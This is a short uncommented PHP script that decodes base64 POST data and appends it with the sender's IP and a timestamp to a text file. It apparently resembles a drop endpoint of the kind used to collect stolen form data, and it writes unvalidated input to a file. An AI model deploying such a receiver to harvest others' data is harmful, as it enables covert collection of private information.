<?php


error_reporting(E_ALL);
ini_set('display_errors','On');

date_default_timezone_set('America/New_York');

$log = "rp.txt";

$current_time = date("Y-m-d H:i:s",time());
$ip_address = $_SERVER['REMOTE_ADDR'];

$b64_data = '';
$b64_data = @ $_POST['data'];
$post_data = @ base64_decode ($b64_data);

$content = "
_____________________[ $current_time ]_____________________

IP Address: $ip_address

$post_data
_________________________________________________________________\n\n";

if (@$handle = fopen($log, "a")) {
    @fwrite($handle, $content);
    @fclose($handle);
}
else if (@$handle = fopen($log, "w")) {
    @fwrite($handle, $content);
    @fclose($handle);
}


?>
